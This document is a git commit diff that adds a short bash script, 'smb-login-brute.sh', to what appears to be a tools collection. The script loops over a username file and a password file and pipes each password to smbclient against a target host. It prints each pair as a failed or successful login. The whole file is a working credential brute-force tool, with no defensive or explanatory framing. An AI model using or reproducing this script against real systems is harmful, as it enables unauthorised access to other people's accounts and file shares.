22e56388d77f06d2bf2a8bf728960dfefd3f4233
root <root@localhost.localdomain>
2020-06-13 10:25:48 +0300

    Set

---
+++ tools/template/bash/smb-login-brute.sh
@@ -0,0 +1,33 @@
+#!/bin/bash
+#By YaSsInE
+RED='\033[0;31m'
+GR='\033[0;32m'
+failed='NT_STATUS_LOGON_FAILURE'
+timed_out='NT_STATUS_IO_TIMEOUT'
+success='Sharename'
+if [ "$#" -ne 3 ]; then
+	echo "usage: ./smb-login-brute.sh user-file.txt password-file.txt host"
+	exit
+fi
+if [[ ! -e $1 ]];then
+	printf "${RED}[-] Can not open $1 !\n"
+	exit
+fi
+if [[ ! -e $2 ]];then
+        printf "${RED}[-] Can not open $2 !\n"
+        exit
+fi
+for i in $(cat $1);do
+	for j in $(cat $2);do
+		res=$(echo $j | smbclient -L $3 -U $i);
+		if [[ "$res" == *"$failed"* ]]; then
+  			printf "${RED}[-] login failed $i:$j\n"
+		fi
+		if [[ "$res" == *"$success"* ]]; then
+			printf "${GR}[+] login succesfull $i:$j\n"
+		fi
+		if [[ "$res" == *"$timed_out"* ]]; then
+			printf "${RED}[-] Connection timed out !\n"
+		fi
+	done
+done
